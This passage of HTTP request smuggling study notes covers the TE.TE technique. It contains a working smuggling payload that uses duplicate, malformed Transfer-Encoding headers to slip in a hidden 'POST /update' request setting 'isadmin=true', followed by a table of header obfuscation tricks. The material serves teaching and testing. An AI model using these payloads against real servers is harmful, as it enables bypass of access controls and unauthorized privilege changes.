
- **Both front-end & back-end use TE**.
	
- One of the servers is induced to not process TE by obfuscation
	
- Exploits **malformed or duplicate TE headers**.
    

📌 **Payload Example**

```http
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```
💥 Result:
- Front-end ignores malformed TE (`chunked1`) and uses chunked normally.    
- Back-end interprets differently (or falls back to CL).
- Smuggled request (`POST /update`) is executed.

## 🧪 Common TE Obfuscation Tricks
|Technique|Example Header|Why It Works|
|---|---|---|
|**Non-standard token**|`Transfer-Encoding: xchunked`|Some servers ignore invalid TE values → fallback to CL. Others attempt to parse anyway.|
|**Extra space before colon**|`Transfer-Encoding : chunked`|Certain parsers accept it, others don’t.|
|**Trailing junk after chunked**|`Transfer-Encoding: chunked` `Transfer-Encoding: x`|One server may parse as chunked, another sees invalid TE.|
|**Tab character instead of space**|`Transfer-Encoding:[tab]chunked`|Tabs are legal separators in HTTP/1.1 but not consistently handled.|
|**Leading space in header name**|`[space]Transfer-Encoding: chunked`|Some parsers ignore header, others parse it.|
|**Header smuggling with newline**|`X: X[\n]Transfer-Encoding: chunked`|Injects a hidden TE header. Front-end may ignore, back-end parses it.|
|**Header split across lines**|`Transfer-Encoding\r\n: chunked`|Newline before colon splits parsing logic between servers.|
|**Multiple TE headers**|`Transfer-Encoding: chunked` `Transfer-Encoding: cow`|Some servers use **first header**, others use **last**.|
|**Case manipulation**|`tRaNsFeR-eNcOdInG: ChUnKeD`|Case-insensitivity is required by RFC, but parsing bugs exist.|
|**Comma-separated encodings**|`Transfer-Encoding: gzip, chunked`|RFC-compliant but often mis-parsed → servers disagree on order.|

It is necessary to find some variation of the TE header such that only one of the front-end or back-end servers processes it, while the other server ignores it.